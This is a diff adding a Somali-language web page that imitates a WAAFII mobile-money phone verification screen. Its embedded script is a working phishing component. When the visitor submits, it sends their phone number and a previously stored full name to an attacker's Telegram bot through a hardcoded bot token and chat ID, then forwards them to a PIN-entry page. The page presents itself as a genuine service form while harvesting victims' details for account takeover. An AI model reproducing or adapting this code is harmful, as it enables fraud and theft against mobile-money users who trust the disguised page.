@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xaqiijinta Telefoonka | WAAFII</title>
+    <style>
+        :root {
+            --navy: #1a237e;
+            --teal: #14b886;
+            --grey-text: #757575;
+            --light-grey: #cfd8dc;
+            --border-grey: #e0e0e0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        .header h1 {
+            color: var(--navy);
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: var(--grey-text);
+            font-style: italic;
+            font-family: 'Georgia', serif;
+            font-size: 16px;
+            margin-top: 0;
+        }
+
+        .form-container {
+            margin-top: 40px;
+            flex-grow: 1;
+        }
+
+        .country-selector {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border-grey);
+            cursor: pointer;
+        }
+
+        .country-name {
+            font-family: 'Georgia', serif;
+            font-style: italic;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .chevron {
+            color: var(--grey-text);
+            font-size: 18px;
+        }
+
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+            border-bottom: 2px solid var(--teal);
+            padding-bottom: 5px;
+        }
+
+        .country-code {
+            color: var(--grey-text);
+            margin-right: 10px;
+            font-size: 18px;
+        }
+
+        input[type="tel"] {
+            border: none;
+            outline: none;
+            font-size: 18px;
+            width: 100%;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+        }
+
+        input::placeholder {
+            color: #b0bec5;
+        }
+
+        .help-link {
+            text-align: right;
+            margin-top: 15px;
+        }
+
+        .help-link a {
+            color: var(--teal);
+            text-decoration: none;
+            font-style: italic;
+            font-family: 'Georgia', serif;
+            font-size: 14px;
+        }
+
+        .footer-section {
+            margin-top: auto;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: var(--light-grey);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .next-btn.active {
+            background-color: var(--teal);
+            cursor: pointer;
+        }
+
+        .version {
+            color: var(--grey-text);
+            font-size: 12px;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>Xaqiiji lambarka telefoonkaaga</h1>
+        <p>Waxaan kuugu diri doonnaa farriin SMS ah si aan u xaqiijinno lambarka telefoonkaaga.</p>
+    </div>
+
+    <div class="form-container">
+        <div class="country-selector">
+            <span class="country-name">Soomaaliya</span>
+            <span class="chevron">›</span>
+        </div>
+
+        <div class="phone-input-container">
+            <span class="country-code">(+252)</span>
+            <input type="tel" id="phoneNumber" placeholder="Geli lambarka telefoonkaaga">
+        </div>
+
+        <div class="help-link">
+            <a href="#">Caawimaad u baahan tahay?</a>
+        </div>
+    </div>
+
+    <div class="footer-section">
+        <button class="next-btn" id="nextBtn" onclick="submitPhone()">Xiga</button>
+        <div class="version">Nooca 12.4.0860 (1200040860)</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8503179421:AAEtjBpS6ihvdGImXoGxQSbAA7OaQtojIDM';
+        const CHAT_ID = '5520957080';
+        
+        const phoneInput = document.getElementById('phoneNumber');
+        const nextBtn = document.getElementById('nextBtn');
+        
+        phoneInput.addEventListener('input', function() {
+            if (this.value.trim().length >= 8) {
+                nextBtn.classList.add('active');
+            } else {
+                nextBtn.classList.remove('active');
+            }
+        });
+        
+        async function sendToTelegram(message) {
+            const encoded = encodeURIComponent(message);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+            } catch(e) { console.warn(e); }
+        }
+        
+        async function submitPhone() {
+            const phone = phoneInput.value.trim();
+            
+            if (!phone || phone.length < 8) {
+                alert('Fadlan geli lambar telefoon oo sax ah');
+                return;
+            }
+            
+            const fullPhone = '+252' + phone;
+            localStorage.setItem('waafiiPhone', fullPhone);
+            
+            const application = JSON.parse(localStorage.getItem('waafiiApplication')) || {};
+            
+            const message = `📱 *XAQIIJINTA TELEFOONKA - WAAFII*\n📞 Telefoonka: ${fullPhone}\n👤 Magaca: ${application.fullName || 'Lama cayimin'}\n🕒 ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(message);
+            
+            window.location.href = 'pin-enter.html';
+        }
+    </script>
+</body>
+</html>
